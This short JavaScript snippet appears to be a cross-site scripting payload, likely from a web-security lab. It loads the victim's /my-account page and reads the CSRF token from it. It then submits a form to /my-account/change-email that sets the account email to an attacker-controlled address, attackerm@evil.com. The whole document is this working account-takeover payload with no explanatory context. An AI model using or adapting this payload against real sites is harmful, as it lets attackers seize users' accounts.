var request = new XMLHttpRequest();
request.responseType = "document"
request.open("GET", "/my-account", true);

request.onload = function(e) {
  var csrf = e.target.response['body'].querySelectorAll('[name="csrf"]')[0].value;
  
  data = "email=attackerm@evil.com&csrf=" + csrf
  
  var request = new XMLHttpRequest();
  request.open("POST", "/my-account/change-email", true);
  request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  request.send(data);
}
request.send();
